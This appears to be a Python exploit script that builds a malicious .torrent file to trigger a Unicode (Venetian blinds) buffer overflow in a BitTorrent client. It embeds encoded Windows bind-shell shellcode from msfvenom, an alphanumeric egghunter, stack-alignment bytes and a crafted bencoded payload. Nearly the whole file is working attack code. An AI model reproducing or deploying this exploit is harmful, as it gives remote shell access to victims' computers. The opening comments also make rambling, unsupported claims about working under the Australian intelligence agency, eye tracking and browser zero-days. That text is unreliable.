# Repost of my BitTorrent Venetian Blinds Unicode overflow
# Authored under tutelage of the Australian Security Intelligence Organisation
# Eye movement, keystrokes tracked with screen capture via software package supplied via browser zero-day while coalescing with asio.gov.au cryptanalysis internet cookies
# Very interesting Android and iOS eye movement tracking now, triangularisation of eyes to screen
# Thanks ASIO, done in Immunity x86
# Admired David Irvine and David Fricker via news article discovery since 2007 to 2009. Interesting Aussie spirit. Fricker now runs NAA. Curiously dealing with historical archival information and specification stores, e.g. literature, historical anthropological or architectural specifications.
# Isn't it funny to think everything is the product of an engineering process, e.g. bound to physical, biological and chemical engineering industrial processes or specifications 

t = open("./test.torrent", "w")



#root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LPORT=666 -e x86/shikata_ga_nai -b '\x00\x0d\x0a' prependmigrate=true exitfunc=thread -f python
# 505 bytes

bind =  ""
bind += "\xb8\xb2\x80\xc7\xa2\xda\xd1\xd9\x74\x24\xf4\x5f\x2b"
bind += "\xc9\xb1\x78\x31\x47\x14\x03\x47\x14\x83\xef\xfc\x50"
bind += "\x75\x3b\x4b\x12\x76\xc4\x8c\x47\xf4\x01\x87\xf6\x3e"
bind += "\xf9\x66\x07\x41\x77\xc2\xd3\xde\xda\x83\xaa\x55\xb0"
bind += "\xe2\x33\xbc\xcb\x41\xef\x5f\x3f\x15\xb1\x12\xc7\xc6"
bind += "\x1a\x7d\x09\xdc\xf7\x2e\x01\xe6\xf7\xd0\xd9\xb5\xa4"
bind += "\x83\x8f\x6a\x22\x5d\xfc\xb2\x34\x62\x29\x49\xf8\xe9"
bind += "\x87\x38\xb8\x91\xef\xad\x6b\xc1\xde\x16\xd8\x1a\x17"
bind += "\xc1\x70\x63\xca\x2e\x73\xb9\xbf\x38\xc3\x43\x40\xb9"
bind += "\x38\x76\x10\x46\x89\x11\x55\x60\x48\x06\xaa\x44\xe1"
bind += "\x9a\x06\xec\x49\x39\x55\xa3\x02\x12\x5a\x73\xcc\x52"
bind += "\x08\xe6\x75\xa4\x84\xfe\xc4\x5b\x27\x01\x2e\xc4\xd8"
bind += "\xfe\x51\x89\x53\x6f\xc9\x02\xf0\x5c\x23\xdb\xe0\xd6"
bind += "\xbc\x24\x0f\xf0\x84\x24\x0f\xfe\xf4\x33\x72\x01\x04"
bind += "\xc4\x13\x8b\xe1\xf5\x13\xef\x62\xa5\xa3\x7b\x26\x4a"
bind += "\x4f\x29\xd2\xd9\x3d\xe6\xd5\x6a\x8b\xd0\xd8\x6b\xa0"
bind += "\x21\x7b\xe8\xbb\x75\x5b\xd1\x73\x88\x9a\x16\x69\x61"
bind += "\xce\xcf\xe5\xd4\xfe\x64\xb3\xe4\x75\x36\x55\x6d\x6a"
bind += "\x8f\x54\x5c\x3d\x9b\x0e\x7e\xbc\x48\x3b\x37\xa6\x8d"
bind += "\x06\x81\x5d\x65\xfc\x10\xb7\xb7\xfd\xbf\xf6\x77\x0c"
bind += "\xc1\x3f\xbf\xef\xb4\x49\xc3\x92\xce\x8e\xb9\x48\x5a"
bind += "\x14\x19\x1a\xfc\xf0\x9b\xcf\x9b\x73\x97\xa4\xe8\xdb"
bind += "\xb4\x3b\x3c\x50\xc0\xb0\xc3\xb6\x40\x82\xe7\x12\x08"
bind += "\x50\x89\x03\xf4\x37\xb6\x53\x57\xe7\x12\x18\x7a\xfc"
bind += "\x2e\x43\x13\x31\x03\x7b\xe3\x5d\x14\x08\xd1\xc2\x8e"
bind += "\x86\x59\x8a\x08\x51\x9d\xa1\xed\xcd\x60\x4a\x0e\xc4"
bind += "\xa6\x1e\x5e\x7e\x0e\x1f\x35\x7e\xaf\xca\xa0\x76\x16"
bind += "\xa5\xd6\x7b\xe8\x15\x57\xd3\x81\x7f\x58\x0c\xb1\x7f"
bind += "\xb2\x25\x5a\x82\x3d\x4b\x01\x0b\xdb\x21\x25\x5a\x73"
bind += "\xdd\x87\xb9\x4c\x7a\xf7\xeb\xe4\xec\xb0\xfd\x33\x13"
bind += "\x41\x28\x14\x83\xca\x3f\xa0\xb2\xcc\x15\x80\xa3\x5b"
bind += "\xe3\x41\x86\xfa\xf4\x4b\x70\x9e\x67\x10\x80\xe9\x9b"
bind += "\x8f\xd7\xbe\x6a\xc6\xbd\x52\xd4\x70\xa3\xae\x80\xbb"
bind += "\x67\x75\x71\x45\x66\xf8\xcd\x61\x78\xc4\xce\x2d\x2c"
bind += "\x98\x98\xfb\x9a\x5e\x73\x4a\x74\x09\x28\x04\x10\xcc"
bind += "\x02\x97\x66\xd1\x4e\x61\x86\x60\x27\x34\xb9\x4d\xaf"
bind += "\xb0\xc2\xb3\x4f\x3e\x19\x70\x6f\xdd\x8b\x8d\x18\x78"
bind += "\x5e\x2c\x45\x7b\xb5\x73\x70\xf8\x3f\x0c\x87\xe0\x4a"
bind += "\x09\xc3\xa6\xa7\x63\x5c\x43\xc7\xd0\x5d\x46"


#align = "\x58\xb9\x90\xaa\xec\xb9\x39\xaa\xe8\xb9\xff\xaa\xe8"


#   AD               LODS DWORD PTR DS:[ESI]
#   0041 00          ADD BYTE PTR DS:[ECX],AL
#   AD               LODS DWORD PTR DS:[ESI]
#   0041 00          ADD BYTE PTR DS:[ECX],AL
#   58               POP EAX
#   0055 00          ADD BYTE PTR SS:[EBP],DL
#   B9 000700AA      MOV ECX,AA000700
#   00EC             ADD AH,CH
#   0055 00          ADD BYTE PTR SS:[EBP],DL
#   B9 00CE00AA      MOV ECX,AA00CE00
#   00E8             ADD AL,CH
#   0055 00          ADD BYTE PTR SS:[EBP],DL
#   50               PUSH EAX
#   0055 00          ADD BYTE PTR SS:[EBP],DL
#   59               POP ECX
#   0055 00          ADD BYTE PTR SS:[EBP],DL
#   6A 00            PUSH 0
#   58               POP EAX
#   0055 00          ADD BYTE PTR SS:[EBP],DL
#   55               PUSH EBP




egg =  ""
egg += "\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
egg += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
egg += "\x49\x41\x34\x34\x34\x34\x6a\x58\x41\x51\x41\x44\x41"
egg += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
egg += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
egg += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
egg += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
egg += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
egg += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
egg += "\x47\x42\x39\x75\x34\x4a\x42\x63\x36\x71\x71\x45\x7a"
egg += "\x49\x6f\x4a\x6f\x6e\x62\x72\x32\x30\x6a\x59\x72\x30"
egg += "\x58\x38\x4d\x6e\x4e\x6f\x4c\x39\x75\x30\x5a\x31\x64"
egg += "\x58\x6f\x57\x48\x51\x67\x4c\x70\x6c\x70\x52\x54\x74"
egg += "\x4b\x59\x6a\x36\x4f\x51\x65\x77\x7a\x54\x6f\x74\x35"
egg += "\x77\x77\x69\x6f\x68\x67\x41\x41"

retpayload ="\xad\x41" * 192
retpayload+="\x58" + "\x55" + "\xB9\x07\xAA" + "\xec" + "\x55" "\xB9\xCE\xAA" + "\xe8" + "\x55" + "\x50" + "\x55" + "\x59" + "\x55" + "\x6a" + "\x58" + "\x55" * 49
retpayload+=egg + "\x41" * 300

shellcode="\xcc\xcc\xcc\xcc" + "w00tw00t" + bind + "\x41" * 313
overflow ="d8:announce17:http://qwerty.qwe7:comment"
overflow+="830"
overflow+=":"
overflow+=shellcode
overflow+="10:created by"
overflow+="941"
overflow+=":"
overflow+=retpayload
overflow+="13:creation datei1218555046e8:encoding10:iso-8859-14:infod6:lengthi1e4:name6:bu.txt12:piece lengthi65536e6:pieces20:"
overflow+="\x86\xf7\xe4\x37\xfa\xa5\xa7\xfc\xe1\x5d\x1d\xdc\xb9\xea\xea\xea\x37\x76\x67\xb8\x65\x65\x0a"

t.write(overflow)
t.close()
